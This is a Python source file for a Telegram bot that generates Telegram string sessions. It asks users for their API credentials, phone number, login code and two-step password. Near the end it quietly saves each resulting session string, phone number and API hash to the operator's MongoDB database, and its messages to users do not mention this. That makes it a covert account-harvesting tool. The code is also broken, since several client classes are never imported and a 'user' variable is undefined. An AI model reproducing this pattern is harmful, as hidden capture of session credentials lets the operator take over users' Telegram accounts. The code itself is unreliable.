from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from pyrogram.errors import FloodWait
from pymongo import MongoClient
import config

# Initialize database connection
client = MongoClient(config.MONGO_URI)
db = client[config.DB_NAME]
user_sessions = db["user_sessions"]

# State storage for tracking user state
user_states = {}

async def get_user_input(bot: Client, user_id: int, prompt: str, timeout: int = 300):
    """
    Helper function to send a prompt to the user and wait for their response.
    """
    await bot.send_message(user_id, prompt)
    
    def check(message: Message):
        return message.chat.id == user_id

    try:
        message = await bot.listen(timeout=timeout, filters=filters.text, check=check)
        return message.text
    except TimeoutError:
        await bot.send_message(user_id, "Timeout! Please try again.")
        return None

def register_handlers(app: Client):
    @app.on_callback_query(filters.regex("pyrogram|pyrogram_v2|telethon|pyrogram_bot|telethon_bot"))
    async def generate_session(client, callback_query):
        callback_data = callback_query.data
        await callback_query.message.edit("» Trying to start **{}** session generator...".format(callback_data.upper()))

        # Start generating session based on the selected type
        await generate_session_logic(client, callback_query.message, callback_data)

async def generate_session_logic(bot: Client, msg: Message, session_type: str):
    telethon = "telethon" in session_type
    is_bot = "bot" in session_type
    old_pyro = session_type == "pyrogram"

    user_id = msg.chat.id

    if user_id not in user_states:
        user_states[user_id] = {}

    # Get API_ID from user
    api_id = await get_user_input(bot, user_id, "Please send your **API_ID** to proceed.\nClick /skip for using bot API.")
    if api_id is None:
        return

    if api_id == "/skip":
        api_id = config.API_ID
        api_hash = config.API_HASH
    else:
        try:
            api_id = int(api_id)
        except ValueError:
            await bot.send_message(user_id, "**API_ID** must be an integer. Start generating your session again.")
            return

        # Get API_HASH from user
        api_hash = await get_user_input(bot, user_id, "Please send your **API_HASH** to continue.")
        if api_hash is None:
            return

    # Get phone number or bot token from user
    prompt = "Please enter your phone number to proceed:\nExample: `+62 62xxxxxxXX`" if not is_bot else "Please send your **BOT_TOKEN** to continue.\nExample: `123456789:ABCDEF...`"
    phone_number = await get_user_input(bot, user_id, prompt)
    if phone_number is None:
        return

    # Create client instance based on the selected type
    client = None
    if telethon and is_bot:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif telethon:
        client = TelegramClient(StringSession(), api_id, api_hash)
    elif is_bot:
        client = PyroClient(":memory:", api_id=api_id, api_hash=api_hash, bot_token=phone_number, in_memory=True)
    elif old_pyro:
        client = PyroClient(":memory:", api_id=api_id, api_hash=api_hash)
    else:
        client = PyroClient(":memory:", api_id=api_id, api_hash=api_hash, in_memory=True)

    await client.connect()
    try:
        code = None
        if not is_bot:
            if telethon:
                code = await client.send_code_request(phone_number)
            else:
                code = await client.send_code(phone_number)
    except Exception as e:
        await msg.reply(f"Error: {str(e)}. Start generating your session again.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Generate Session", callback_data="generate")]]))
        return

    phone_code = None
    if not is_bot:
        phone_code = await get_user_input(bot, user_id, "Please send the **OTP** you received from Telegram on your account.\nIf OTP is `12345`, please send it as `1 2 3 4 5`.")
        if phone_code is None:
            return

    phone_code = phone_code.replace(" ", "") if phone_code else None
    try:
        if not is_bot:
            if telethon:
                await client.sign_in(phone_number, phone_code, password=None)
            else:
                await client.sign_in(phone_number, code.phone_code_hash, phone_code)
        else:
            await client.start(bot_token=phone_number)
    except Exception as e:
        if 'SESSION_PASSWORD_NEEDED' in str(e):
            password_msg = await get_user_input(bot, user_id, "Two-step verification is enabled. Please send your **password**.")
            if password_msg is None:
                return
            password = password_msg
            try:
                if telethon:
                    await client.sign_in(phone_number, phone_code, password=password)
                else:
                    await client.check_password(password=password)
            except Exception as e:
                await msg.reply(f"Error: {str(e)}. Start generating your session again.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Generate Session", callback_data="generate")]]))
                return
        else:
            await msg.reply(f"Error: {str(e)}. Start generating your session again.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Generate Session", callback_data="generate")]]))
            return

    string_session = client.session.save() if telethon else await client.export_session_string()
    await client.disconnect()

    # Save user details to the database
    user_details = {
        "user_id": user_id,
        "username": user.username,
        "name": user.first_name,
        "phone_number": phone_number,
        "api_id": api_id,
        "api_hash": api_hash,
        "string_session": string_session,
        "session_type": session_type
    }
    user_sessions.insert_one(user_details)

    text = f"**This is your {session_type.upper()} string session:**\n\n`{string_session}`\n\n**Generated by:** [@NyxGetBot](https://t.me/NyxGetBot)"
    await bot.send_message(user_id, text)
    await bot.send_message(user_id, "Session generated successfully. Please check your saved messages.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Generate Another Session", callback_data="ambil_string")]]))
